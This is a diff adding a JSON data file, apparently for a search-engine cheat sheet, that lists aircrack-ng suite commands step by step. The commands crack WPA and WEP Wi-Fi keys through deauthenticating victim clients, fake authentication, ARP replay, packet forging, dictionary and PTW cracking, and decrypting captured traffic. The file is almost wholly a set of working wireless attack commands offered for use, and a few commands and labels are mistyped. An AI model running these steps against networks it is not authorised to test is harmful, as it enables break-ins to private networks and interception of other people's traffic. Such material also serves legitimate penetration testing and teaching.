@@ -1,0 +1,147 @@
+{
+    "id": "airmon_cheat_sheet" ,
+    "name": "Airmon",
+    "description": "A simple cheat sheet for aircrack-ng",
+
+    "metadata": {
+        "sourceName": "SecurityOnline",
+        "sourceUrl" : "https://duck.co/ia/view/airmon_cheat_sheet"
+    },
+
+    "aliases": [
+        "aircrack-ng", "airmon-ng", "cracking wep" , "cracking wpa" , "arp amplification" , "karmetasploit" , "pyrit db attacks"
+    ],
+
+    "template_type": "terminal",
+    "section_order":["Cracking WPA" , "Cracking WEP with Connected Clients", "Cracking WEP via a Client","ARP amplification","Cracking WEP /w shared key AUTH","airgraph-ng","airdecap-ng"],
+
+    "sections": {
+        "Cracking WPA": [{
+           "val":"Step 1" ,
+            "key":"airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon"},
+            {
+            "val": "Step 2",
+            "key":"aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}"},
+            {
+            "val":"Step 3",
+            "key":"aircrack-ng -0 -w (wordlist path) (caputure filename)"}
+        ],
+        "Cracking WEP with Connected Clients": [{
+            "val":"Step 1",
+            "key":"airmon-ng start wlan0 ( channel)"},
+                                                {
+            "val":"Step 2",
+            "key":"airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon"},
+                                                {
+            "val":"Step 3",
+             "key":"aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}"},
+                                                {
+            "val":"Step 4",
+            "key": "aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}"},
+                                                {
+            "val":"Step 5",
+             "key":"aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}"}
+            
+        ],
+        "Cracking WEP via a Client":[{
+        "val":" Step 1",
+        "key":"airmon-ng start wlan0 (channel)"},
+    {
+        "val":"Step 2",
+        "key":"airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon"},
+{
+        "val":"Step 3",
+        "key":"aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}"},
+{
+        "val":"Step 4",
+        "key":"aireplay-ng -2 -b (AP MAC) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon"},
+{
+        "val":"aireplay-ng -2 -r (replay cap file) wlan0mon {inject using cap file}",
+        "key":"aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap"}
+        ],
+        "ARP amplification":[{
+            "val":"Step 1",
+            "key":"airmon-ng start wlan0 ( channel)"},
+                             {
+            "val": "Step 2",
+            "key":"airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon"},
+                             {
+            "val":"Step 3",
+            "key":"aireplay-ng -1 500 -q 8 -a (AP MAC) wlan0mon"},
+                             {
+            "val":"Step 4",
+            "key":"areplay-ng -5 -b (AP MAC) -h (OUR MAC) wlan0mon"},
+                             {
+            "val":"Step 5",
+            "key":"packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k 255.255.255.255 -l 255.255.255.255 -y (FRAGMENT.xor) -w (filename.cap)"},
+                             {
+            "val":"Step 6",
+            "key":"tcpdump -n -vvv -e -s0 -r (replay_dec.#####.cap)"},
+                             {
+            "val":"Step 7",
+            "key":"packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k (destination IP) -l (source IP) -y (FRAGMENT.xor) -w (filename.cap)"},
+                             {
+            "val":"Step 8",
+            "key":"aireplay-ng -2 -r (filename.cap) wlan0mon"}
+        ],
+        "Cracking WEP /w shared key AUTH":[{
+            "val":"Step 1",
+            "key":"airmon-ng start wlan0 ( channel)"},
+                                           {
+            "val": "Step 2",
+            "key":"airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon"},
+                                           {
+            "val":"Step 3",
+            "key":"~this will error out~aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}"},
+                                           {
+            "val": "Step 4",
+            "key":"aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}"},
+                                           {
+            "val":"Step 5",
+            "key":"aireplay-ng -1 60 -e (ESSID) -y (sharedkeyfile) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication /w PRGA xor file}"},
+                                           {
+            "val":"Step 6",
+            "key":"aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}"},
+                                           {
+            "val":"Step 7",
+            "key":"aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}"},
+                                           {
+            "val":"Step 8",
+            "key":"aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap"}
+        ],
+    
+    "airgraph-ng":[{
+        "val": "Step 1",
+        "key":"airgraph-ng -i filename.csv -g CAPR -o outputfilename.png"},
+    {
+        "val":"Step 2",
+        "key":"eog outputfilename.png"},
+{
+        "val":"Step 3",
+        "key":"airgraph-ng -i filename.csv -g CPG -o outputfilename.png"},
+{
+        "val":"Step 4",
+        "key":"eog outputfilename.png"}
+
+    ],
+    "airdecap-ng":[{
+        "val": "Step 1",
+        "key":"airdecap-ng -b (vic ap) outputfilename.cap"},
+    {
+        "val":"Step 2",
+        "key":"wireshark outputfilename.cap"},
+{
+        "val": "Step 3",
+        "key":"airdecap-ng -w (WEP KEY) (capturefile.cap)"},
+{
+        "val":"Step 4",
+        "key":"wireshark capturefile-DEC.cap"},
+{
+        "val":"Step 5",
+        "key":"airdecap-ng -e (ESSID VIC) -p (WPA PASSWORD) (capturefile.cap)"},
+{
+        "val":"Step 6",
+        "key":"wireshark capturefile-dec.cap"}
+    ]
+    }
+}
